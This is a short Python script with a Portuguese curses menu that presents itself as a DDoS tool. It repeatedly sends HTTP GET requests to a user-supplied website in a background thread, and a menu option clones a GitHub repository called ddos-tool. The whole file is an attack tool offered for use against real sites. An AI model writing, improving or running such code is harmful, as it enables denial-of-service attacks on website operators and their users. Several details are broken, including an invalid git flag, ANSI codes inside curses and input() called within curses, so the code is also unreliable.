#!/usr/bin/python3
import requests
import threading
import argparse
import os
import subprocess
import curses
import random
import time

TARGET = ""

LOGO = """
\033[92m ######   ####    ######   #### 
     ##  #    #       ##  #    #
     ##  #    #       ##  #    #
 #   ##  #    #  #    ##  #    #   
  ####    ####    #####    ####  
\033[0m"""

def attack(target):
    while True:
        try:
            response = requests.get(target)
            print("\033[92mRequest sent to:\033[0m", target)
        except Exception as e:
            print("\033[91mFailed to send request:\033[0m", e)
        time.sleep(random.uniform(0.5, 2.0))

def clone_repository(stdscr):
    stdscr.clear()
    height, width = stdscr.getmaxyx()
    stdscr.addstr(0, (width // 2) - 15, "\033[92mClonando repositório...\033[0m")
    stdscr.refresh()
    
    subprocess.run(["git", "clone", "--force", "https://github.com/JOJOofSouls/ddos-tool.git"])
    
    stdscr.addstr(2, (width // 2) - 15, "\033[92mRepositório clonado com sucesso!\033[0m")
    stdscr.addstr(3, (width // 2) - 15, "\033[92mPressione qualquer tecla para continuar...\033[0m")
    stdscr.getch()

def main(stdscr):
    global TARGET
    stdscr.clear()
    height, width = stdscr.getmaxyx()
    stdscr.addstr(0, (width // 2) - len(LOGO.split("\n")[0]) // 2, LOGO)
    stdscr.addstr(height - 3, 0, "Use as setas para navegar e pressione Enter para selecionar uma opção")
    stdscr.refresh()

    options = [
        ("Iniciar Ataque", "a"),
        ("Clonar Repositório", "c"),
        ("Instalar Dependências", "i"),
        ("Sair", "q")
    ]
    current_option = 0

    while True:
        stdscr.clear()
        stdscr.addstr(0, (width // 2) - len(LOGO.split("\n")[0]) // 2, LOGO)
        for idx, option in enumerate(options):
            x = width // 2 - len(option[0]) // 2
            y = height // 2 - len(options) // 2 + idx
            if idx == current_option:
                stdscr.attron(curses.A_REVERSE)
                stdscr.addstr(y, x, option[0])
                stdscr.attroff(curses.A_REVERSE)
            else:
                stdscr.addstr(y, x, option[0])
        stdscr.refresh()

        key = stdscr.getch()

        if key == curses.KEY_UP and current_option > 0:
            current_option -= 1
        elif key == curses.KEY_DOWN and current_option < len(options) - 1:
            current_option += 1
        elif key == curses.KEY_ENTER or key in [10, 13]:
            if options[current_option][1] == "a":
                TARGET = input("Coloque o site: ")
                attack_thread = threading.Thread(target=attack, args=(TARGET,))
                attack_thread.start()
            elif options[current_option][1] == "c":
                clone_repository(stdscr)
            elif options[current_option][1] == "i":
                pass
            elif options[current_option][1] == "q":
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ferramenta de DDoS")
    parser.add_argument("--target", type=str, help="URL do alvo")
    args = parser.parse_args()

    if args.target:
        TARGET = args.target
        attack_thread = threading.Thread(target=attack, args=(TARGET,))
        attack_thread.start()
    else:
        curses.wrapper(main)
